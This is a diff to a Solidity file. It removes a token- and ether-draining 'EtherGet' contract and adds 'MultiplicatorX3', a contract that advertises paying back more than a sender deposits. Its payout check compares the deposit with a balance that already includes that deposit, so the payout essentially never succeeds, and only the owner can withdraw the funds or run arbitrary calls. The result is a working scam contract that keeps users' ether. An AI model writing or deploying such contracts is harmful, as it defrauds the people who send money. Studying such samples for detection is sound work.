@@ -1,24 +1,35 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.4.19;
-contract Token {
-    function transfer(address _to, uint _value) returns (bool success);
-    function balanceOf(address _owner) constant returns (uint balance);
-}
-contract EtherGet {
-    address owner;
-    function EtherGet() {
-        owner = msg.sender;
+pragma solidity ^0.4.18;
+
+contract MultiplicatorX3
+{
+    address public Owner = msg.sender;
+
+    function() public payable{}
+
+    function withdraw()
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
     }
-    function withdrawTokens(address tokenContract) public {
-        Token tc = Token(tokenContract);
-        tc.transfer(owner, tc.balanceOf(this));
+
+    function Command(address adr,bytes data)
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+        adr.call.value(msg.value)(data);
     }
-    function withdrawEther() public {
-        owner.transfer(this.balance);
-    }
-    function getTokens(uint num, address addr) public {
-        for(uint i = 0; i < num; i++){
-            addr.call.value(0 wei)();
+
+    function multiplicate(address adr)
+    public
+    payable
+    {
+        if(msg.value>=this.balance)
+        {
+            adr.transfer(this.balance+msg.value);
         }
     }
 }
